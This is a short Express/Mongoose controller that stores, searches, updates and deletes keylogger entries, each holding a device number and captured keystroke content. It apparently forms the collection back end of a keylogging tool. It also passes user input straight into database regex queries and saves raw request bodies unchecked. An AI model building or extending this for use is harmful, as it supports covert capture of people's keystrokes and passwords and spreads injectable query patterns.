import KeyloggerEntry from "../models/KeyloggerSchema.js";

export const getKeyloggerEntries = async (req, res) => {
  try {
    const { page = 1, limit = 10, deviceNumber, content } = req.query;
    const query = {};
    if (deviceNumber) query.deviceNumber = { $regex: deviceNumber, $options: 'i' };
    if (content) query.content = { $regex: content, $options: 'i' };

    const entries = await KeyloggerEntry.find(query)
      .limit(limit * 1)
      .skip((page - 1) * limit)
      .exec();

    const count = await KeyloggerEntry.countDocuments(query);

    res.json({
      entries,
      totalPages: Math.ceil(count / limit),
      currentPage: page,
      totalItems: count
    });
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
};

export const createKeyloggerEntry = async (req, res) => {
  const entry = new KeyloggerEntry(req.body);

  try {
    const newEntry = await entry.save();
    res.status(201).json(newEntry);
  } catch (err) {
    res.status(400).json({ message: err.message });
  }
};

export const deleteKeyloggerEntry = async (req, res) => {
  try {
    await KeyloggerEntry.findByIdAndDelete(req.params.id);
    res.json({ message: 'Keylogger entry deleted successfully' });
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
};

export const updateKeyloggerEntry = async (req, res) => {
  try {
    const updatedEntry = await KeyloggerEntry.findByIdAndUpdate(
      req.params.id,
      req.body,
      { new: true }
    );
    res.json(updatedEntry);
  } catch (err) {
    res.status(400).json({ message: err.message });
  }
};